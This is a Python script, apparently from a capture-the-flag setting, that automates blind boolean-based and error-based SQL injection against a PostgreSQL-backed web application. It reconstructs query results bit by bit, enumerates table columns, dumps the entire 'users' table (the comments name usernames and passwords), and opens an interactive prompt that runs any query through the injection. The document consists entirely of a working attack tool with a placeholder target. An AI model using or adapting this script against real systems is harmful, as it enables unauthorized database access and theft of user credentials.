from __future__ import print_function

import re, os, sys


def get_cols(table, template, fn, get_str):
    query = "(select COUNT(column_name) from information_schema.columns where table_name='%s')" % (table)
    v = get_str(template, query, fn)
    columns = []
    for i in range(int(v)):
        query = "(select column_name from information_schema.columns where table_name='%s' limit 1 offset %d)" % (table, i)
        c = get_str(template, query, fn)
        columns.append(c)
    return columns

def dump_table(table, template, fn, get_str):
    columns = get_cols(table, template, fn, get_str)
    print(columns)
    query = "(select COUNT(*) from %s)" % table
    n = get_str(template, query, fn)
    records = []
    for i in range(int(n)):
        cols_ = ','.join(map(lambda x: x+"::text", columns))
        query = "(select concat_ws('|', %s) from %s limit 1 offset %d)" % (cols_, table, i)
        try:
            s = get_str(template, query, fn)
            print(s)
            records.append(s.split('|'))
        except Exception as e:
            pass
    return records
    

def binary_search(fn, template, v1, maxLength=None):
    _sum, i = 0, 1
    if maxLength is not None:
        assert maxLength > 0, "Invalid Maximum Length ({0})".format(maxLength)
    while True:
        if maxLength is None and fn(template % (v1, i, '""')):
            break
        elif i-1 == maxLength:
            break
        _sum *= 2
        if fn(template % (v1, i, '1::bit(1)')):
            _sum += 1
        i += 1
    return _sum


# blind get character
def get_string(template, val, func):
    # val: 'version()'
    # get length
    ltemp = 'mid(length(%s)::bit(8), %d, 1) = %s'
    length = binary_search(func, template % ltemp, val)
    print('length: %d' % length)

    wtemp = 'mid(ascii(mid(%s, {0}, 1))::bit(8), %d, 1) = %s'
    print('\r' + '_' * length, end='')
    output = ''
    for j in range(length):
        _ascii = binary_search(func, template % wtemp.format(j+1), val, 8)
        output += chr(_ascii)
        print('\r' + output + '_' * (length-j-1), end='')
        sys.stdout.flush()
    print()
    return output

# error-based sqli
# subq example: select concat_ws(',', username, password) from users limit 1 offset 0
def get_string_by_error(template, subq, getVal):

    anchor = 'ggag'
    subq = "concat('{0}',{1},'{0}')".format(anchor, subq)
    ssql = template % subq
    v = getVal(ssql)
    mobj = re.match('{0}(.*){0}'.format(anchor), v)
    return mobj.group(1)

if __name__ == '__main__':


    # ==== example ====
    # TODO: adapt to your target
    url = 'http://<vuln-ip>/'

    # boolean based SQLi
    def boolean(ssql):
        from lxml import html
        import requests

        # post processing here
        ssql = ssql.replace('"', '$$')
        ssql = ssql.replace('\'', '$$')
        ssql = ssql.replace('mid', 'substring')

        res = requests.get(url, params=dict(q=ssql))
        assert res.status_code == 200
        text_len = len(res.text)
        assert text_len == 666 or text_len == 0, "Invalid Text Length (%d), Query (%s)" % (text_len, ssql)
        rt = html.fromstring(res.text)
        # Google Apple Facebook  -> false
        return not rt.xpath('//nav[@class="links"]/ul/li')[0].text.startswith('Google')

    # error based SQLi
    def extractInfo(sql):
        import requests

        # post processing here
        sql = sql.replace('"', '$$')
        sql = sql.replace('\'', '$$')

        # WTF?!  why it needs Accept header QAQ
        res = requests.get(url, params=dict(q=sql), headers={'Accept': 'text/html'})#, proxies=dict(http='http://127.0.0.1:8080'))
        assert res.status_code == 500, "Not 500?! %d" % (res.status_code)
        return res.text.split('&quot;')[1]
    # ================

    # find all users
    temp = "(case when %s then xxx else yyy end)-- -"
    temp_error = "(case when cast ((%s) as numeric)=1 then xxx else yyy end)-- -"
    rows = dump_table('users', temp_error, extractInfo, get_string_by_error)
    for r in rows:
        print(r)

    while True:
        query = raw_input("> ").strip()
        try:
            s = get_string(temp, query, boolean)  # boolean-based
            #s = get_string_by_error(temp_error, query) # error-based
            print(s)
        except AssertionError as e:
            print(e)
